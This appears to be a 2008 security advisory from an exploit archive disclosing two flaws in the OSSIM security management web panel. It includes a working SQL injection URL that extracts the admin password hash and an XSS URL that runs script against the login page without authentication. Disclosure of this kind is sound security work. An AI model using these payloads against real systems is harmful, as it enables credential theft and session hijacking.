@@ -1,0 +1,32 @@
+Application: OSSIM
+http://www.ossim.net
+Version: 0.9.9rc5 
+Note: it is possible that the problem affects also earlier OSSIM versions
+Platforms: Linux
+Bug: SQL injection, Cross Site Scripting
+Exploitation: remote
+Date: 21 Feb 2008
+Author: Marcin Kopec
+E-mail: marcin(dot)kopec(at)hotmail(dot)com
+
+---------------------------------------
+
+1) Introduction
+
+OSSIM it's a free implementation of  Security Information Management (SIM) system, equipped with many useful security tools (nessus, snort, p0f, ntop, ...) managed from easy-to-use web panel.
+
+2) SQL injection
+
+The bug exist in portname parameter of modifyportform.php
+It's possible to obtain hashed administrator password when user have rights to do port modification in "PORTS" tab.
+
+http://[host]/ossim/port/modifyportform.php?portname=ANY'%20and%201=2%20union%20select%20pass,2%20from%20ossim.users%20where%20login='admin
+
+3) XSS
+
+Quotes in OSSIM aren't property sanitized.  
+Below XSS may be executed without logging into the OSSIM.
+
+http://[host]/ossim/session/login.php?dest=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--
+
+# milw0rm.com [2008-02-21]
